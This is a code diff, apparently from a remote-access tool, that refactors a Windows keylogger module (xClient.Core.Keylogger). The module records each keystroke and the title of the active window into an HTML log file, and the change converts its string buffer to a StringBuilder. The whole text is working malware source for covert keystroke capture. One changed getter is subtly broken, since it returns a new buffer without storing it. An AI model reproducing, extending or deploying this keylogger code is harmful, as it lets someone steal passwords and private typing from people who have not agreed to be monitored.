@@ -63,7 +63,8 @@ namespace xClient.Core.Keylogger
             }
         }
 
-        private string _keyBuffer;
+        private StringBuilder _keyBuffer_;
+        private StringBuilder _keyBuffer { get { return _keyBuffer_ ?? new StringBuilder(); } set { _keyBuffer_ = value; } }
         private string _hWndTitle;
         private string _hWndLastTitle;
 
@@ -78,7 +79,7 @@ namespace xClient.Core.Keylogger
         public Logger(double flushInterval)
         {
             Instance = this;
-            _hWndLastTitle = "";
+            _hWndLastTitle = string.Empty;
 
             WriteFile();
 
@@ -141,48 +142,33 @@ namespace xClient.Core.Keylogger
                         {
                             _hWndLastTitle = _hWndTitle;
 
-                            _keyBuffer += "<br><br>[<b>" + _hWndTitle + "</b>]<br>";
+                            _keyBuffer.Append("<br><br>[<b>" + _hWndTitle + "</b>]<br>");
                         }
                     }
 
                     switch (i)
                     {
                         case 8:
-                            _keyBuffer += "<font color=\"0000FF\">[Back]</font>";
+                            _keyBuffer.Append("<font color=\"0000FF\">[Back]</font>");
                             return;
                         case 9:
-                            _keyBuffer += "<font color=\"0000FF\">[Tab]</font>";
+                            _keyBuffer.Append("<font color=\"0000FF\">[Tab]</font>");
                             return;
                         case 13:
-                            _keyBuffer += "<font color=\"0000FF\">[Enter]</font><br>";
+                            _keyBuffer.Append("<font color=\"0000FF\">[Enter]</font><br>");
                             return;
                         case 32:
-                            _keyBuffer += " ";
+                            _keyBuffer.Append(" ");
                             return;
                         case 46:
-                            _keyBuffer += "<font color=\"0000FF\">[Del]</font>";
+                            _keyBuffer.Append("<font color=\"0000FF\">[Del]</font>");
                             return;
                     }
 
                     if (_enumValues.Contains(i)) //If our enumValues list contains to current key pressed
                     {
-                        if (ShiftKey && CapsLock) //If the state of Shiftkey is down and Capslock is toggled on
-                        {
-                            _keyBuffer += FromKeys(i, true, true);
-                            return;
-                        }
-                        if (ShiftKey) //If only the Shiftkey is pressed
-                        {
-                            _keyBuffer += FromKeys(i, true, false);
-                            return;
-                        }
-                        if (CapsLock) //If only Capslock is toggled on
-                        {
-                            _keyBuffer += FromKeys(i, false, true);
-                            return;
-                        }
+                        _keyBuffer.Append(FromKeys(i, ShiftKey, CapsLock));
 
-                        _keyBuffer += FromKeys(i, false, false);
                         return;
                     }
                 }
@@ -221,10 +207,10 @@ namespace xClient.Core.Keylogger
                                     "<meta http-equiv='Content-Type' content='text/html; charset=utf-8' />Log created on " +
                                     DateTime.Now.ToString("dd.MM.yyyy HH:mm") + "<br>");
 
-                                if (_keyBuffer != "")
+                                if (_keyBuffer.Length > 0)
                                     sw.Write(_keyBuffer);
 
-                                _hWndLastTitle = "";
+                                _hWndLastTitle = string.Empty;
                             }
                             else
                                 sw.Write(_keyBuffer);
@@ -239,7 +225,7 @@ namespace xClient.Core.Keylogger
             {
             }
 
-            _keyBuffer = "";
+            _keyBuffer = new StringBuilder();
         }
 
         private string GetActiveWindowTitle()
@@ -250,7 +236,7 @@ namespace xClient.Core.Keylogger
 
             string title = sbTitle.ToString();
 
-            return title != "" ? title : null;
+            return title != string.Empty ? title : null;
         }
 
         private IntPtr GetActiveKeyboardLayout()
